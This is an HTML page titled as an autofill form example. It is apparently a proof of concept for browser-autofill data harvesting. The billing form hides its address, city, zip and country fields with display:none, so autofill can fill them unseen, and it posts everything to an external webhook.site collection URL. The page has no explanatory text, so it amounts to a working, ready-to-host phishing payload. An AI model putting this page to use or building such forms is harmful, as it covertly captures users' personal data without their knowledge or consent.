<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Autofill Form Example</title>
</head>
<body>
  <h2>Autofill Form</h2>

<form name="addr1.sections" id="sections1" action="https://webhook.site/2527c941-3bf4-49ef-b134-4061a7f43d81" method="post">
  <div id="billing1">
    Name: <input type="text" name="name"><br>
    Address: <input style="display:none;" type="text" name="address"><br>
    City: <input style="display:none;" type="text" name="city"><br>
    State: <select name="state">
      <option value="CA">CA</option>
      <option value="MA">MA</option>
      <option value="NY">NY</option>
      <option value="MD">MD</option>
      <option value="OR">OR</option>
      <option value="OH">OH</option>
      <option value="IL">IL</option>
      <option value="DC">DC</option>
    </select> <br>
    Zip: <input style="display:none;" name="zip"> <br>
    Country: <input style="display:none;" name="country"> <br>
    Email: <input name="email"> <br>
  </div>
    Ship to the same address:
    <input name="same" type="checkbox" checked="checked" onchange="changeVisibility(this, 'shipping1')">
  <div id="shipping1" style="display: none;">
    <h2>Shipping Address</h2>
    Name: <input type="text" name="s_name"><br>
    Address: <input type="text" name="s_address"><br>
    City: <input type="text" name="s_city"><br>
    State: <select name="s_state">
      <option value="CA">CA</option>
      <option value="MA">MA</option>
      <option value="NY">NY</option>
      <option value="MD">MD</option>
      <option value="OR">OR</option>
      <option value="OH">OH</option>
      <option value="IL">IL</option>
      <option value="DC">DC</option>
    </select> <br>
    Zip: <input name="s_zip"> <br>
    Country: <input name="s_country"> <br>
    Email: <input name="s_email"> <br>
  </div>
  <div>
    <input type="reset" value="Reset">
    <input type="submit" value="Submit">
  </div>
</form>
</body>
</html>
